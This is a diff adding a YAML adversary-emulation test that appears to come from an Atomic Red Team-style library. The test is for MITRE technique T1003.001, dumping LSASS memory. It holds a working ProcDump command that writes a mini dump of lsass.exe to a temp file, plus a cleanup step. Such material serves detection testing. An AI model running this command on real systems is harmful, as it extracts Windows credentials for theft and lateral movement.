@@ -1,0 +1,28 @@
+---
+- id: 54643bf2018c940ca5fc21097884d2d4
+  name: Create Mini Dump of LSASS.exe using ProcDump
+  description: 'The memory of lsass.exe is often dumped for offline credential theft
+    attacks. This can be achieved with Sysinternals
+
+    ProcDump. This particular method uses -mm to produce a mini dump of lsass.exe
+
+
+    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.
+
+
+    If you see a message saying "procdump.exe is not recognized as an internal or
+    external command", try using the  get-prereq_commands to download and install
+    the ProcDump tool first.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      cmd:
+        command: '"PathToAtomicsFolder\..\ExternalPayloads\procdump.exe" -accepteula
+          -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp'
+        payloads: []
+        cleanup: del "C:\Windows\Temp\lsass_dump.dmp" >nul 2> nul
